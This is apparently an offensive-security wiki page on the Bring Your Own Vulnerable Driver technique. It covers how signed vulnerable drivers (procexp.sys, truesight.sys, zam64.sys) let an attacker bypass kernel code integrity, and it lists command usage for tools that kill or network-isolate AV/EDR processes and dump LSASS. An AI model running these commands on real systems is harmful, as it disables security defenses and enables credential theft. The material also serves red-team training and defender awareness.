---
description: MITRE ATT&CK™ Exploitation for Privilege Escalation - Technique T1068
---

# Bring Your Own Vulnerable Driver (BYOVD)

## Theory

As a security mechanism, Windows by default employs a feature called [Driver Signature Enforcement ](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/driver-signing)that ensures kernel-mode drivers have been signed by a valid code signing authority before Windows will permit them to run.

However, we may bring a signed vulnerable driver onto a compromised machine so that we can exploit the vulnerability to execute code in kernel mode.&#x20;

{% hint style="danger" %}
That technique requires administrative privileges on the target.
{% endhint %}

## Practice

### Killing AV/EDDR

Gaining kernel-mode access through vulnerable drivers exploit enables a [Windows Kernel-Mode Code Integrity (KMCI)](https://learn.microsoft.com/en-us/windows/security/hardware-security/enable-virtualization-based-protection-of-code-integrity) bypass, allowing the termination of [Protected Process Light (PPL)](https://learn.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-#system-protected-process) processes, such as EDR or AV tools.

{% tabs %}
{% tab title="procexp.sys " %}
[Backstab](https://github.com/Yaxser/Backstab) is a tool capable of killing antimalware protected processes by leveraging sysinternals’ [Process Explorer](https://learn.microsoft.com/fr-fr/sysinternals/downloads/process-explorer) driver ([procexp.sys](https://www.loldrivers.io/drivers/0567c6c4-282f-406f-9369-7f876b899c25/?query=procexp)).

```bash
# -n,	Choose process by name, including the .exe suffix
# -p, 	Choose process by PID
# -l, 	List handles of protected process
# -k, 	Kill the protected process by closing its handles
# -x, 	Close a specific handle
# -d, 	Specify path to where ProcExp will be extracted
# -s, 	Specify service name registry key
# -u, 	Unload ProcExp driver
# -a,	adds SeDebugPrivilege

#Examples:
#Kill cyserver
backstab.exe -n cyserver.exe -k

#Close handle E4C of cyserver
backstab.exe -n cyserver.exe -x E4C

#List all handles of cyserver
backstab.exe -n cyserver.exe -l

#Kill protected process with PID 4326, extract ProcExp driver to C:\ drive
backstab.exe -p 4326 -k -d c:\\driver.sys
```
{% endtab %}

{% tab title="truesight.sys" %}
[Truesight.sys](https://www.loldrivers.io/drivers/e0e93453-1007-4799-ad02-9b461b7e0398/?query=truesight.s) is a vulnerable driver from Rogue Anti-Malware Driver 3.3. It can be abuse to kill a PPL process

#### Darkside

[Darkside](https://github.com/ph4nt0mbyt3/Darkside) is a C# AV/EDR Killer that exploit the truesight.sys driver. To exploit, first load and start the driver:

```powershell
sc create TrueSight binPath="c:\path\to\truesight.sys" type= kernel start= demand
sc start TrueSight
```

Then, start Darkside by specifing the PID to kill.

```powershell
Darkside.exe -p <PID>
```

#### TrueSightKiller

[TrueSightKiller](https://github.com/MaorSabag/TrueSightKiller) is a CPP AV/EDR Killer that exploit the truesight.sys driver. To exploit, you need to have the `truesight.sys` driver located at the same location as the executable.

```powershell
# By porcess name
TrueSightKiller.exe -n <ProcessName.exe>

# By pid
TrueSightKiller.exe -p <PID>
```
{% endtab %}

{% tab title="zam64.sys" %}
[Terminator](https://github.com/ZeroMemoryEx/Terminator) terminate all EDR/XDR/AVs processes by abusing the [zam64.sys](https://www.loldrivers.io/drivers/e5f12b82-8d07-474e-9587-8c7b3714d60c/?query=zam64) driver. To exploit, place the driver Terminator.sys in the same path as the executable

```
Terminator.exe
```
{% endtab %}
{% endtabs %}

### Windows Filtering Platform (WPF) Callout Driver

A callout driver implements one or more [callouts](https://learn.microsoft.com/en-us/windows-hardware/drivers/network/callout). Callouts extend the capabilities of the [Windows Filtering Platform](https://learn.microsoft.com/en-us/windows/win32/fwp/windows-filtering-platform-start-page) by processing TCP/IP-based network data in ways that are beyond the scope of the simple filtering functionality. By exploiting such driver we can block outbound traffic from EDR processes.

{% tabs %}
{% tab title="EDRPrison" %}
[EDRPrison](https://github.com/senzee1984/EDRPrison) leverages a legitimate WFP callout driver, [WinDivert](https://reqrypt.org/windivert.html), to effectively silence EDR systems. This project focuses on network-based evasion techniques.&#x20;

```
EDRPrison.exe
```
{% endtab %}
{% endtabs %}

### Kernel Object Tampering

{% tabs %}
{% tab title="EDRSandblast" %}
[EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) is a tool written in `C` that weaponize a vulnerable signed driver to bypass EDR detections (Notify Routine callbacks, Object Callbacks and `ETW TI` provider) and `LSASS` protections. Multiple userland unhooking techniques are also implemented to evade userland monitoring.

```
Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard | firewall | load_unsigned_driver>
[--usermode] [--unhook-method <N>] [--direct-syscalls] [--add-dll <dll name or path>]*
[--kernelmode] [--dont-unload-driver] [--no-restore]
    [--nt-offsets <NtoskrnlOffsets.csv>] [--fltmgr-offsets <FltmgrOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [--ci-offsets <CiOffsets.csv>] [--internet]
    [--vuln-driver <RTCore64.sys>] [--vuln-service <SERVICE_NAME>]
    [--unsigned-driver <evil.sys>] [--unsigned-service <SERVICE_NAME>]
    [--no-kdp]
[-o | --dump-output <DUMP_FILE>]
```
{% endtab %}
{% endtabs %}

### Hijacking Valid Drivers

{% hint style="info" %}
The technique will not work on HVCI systems due to the impossibility to change the LSTAR pointers if protected by the Hyper-V
{% endhint %}

{% tabs %}
{% tab title="DriverJack" %}
[**DriverJack**](https://github.com/klezVirus/DriverJack) is a tool designed to load a vulnerable driver by abusing lesser-known NTFS techniques. These method bypass the registration of a Driver Service on the system by hijacking an existing service, and also spoof the image path presented in the Driver Load event. To further masquerade the presence of a vulnerable driver, the attack also abuses an Emulated Filesystem Read-Only bypass to swap the content of a driver file on a mounted ISO before loading it.

```
DriverJack.exe
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.trendmicro.com/en_us/research/24/a/kasseika-ransomware-deploys-byovd-attacks-abuses-psexec-and-expl.html" %}
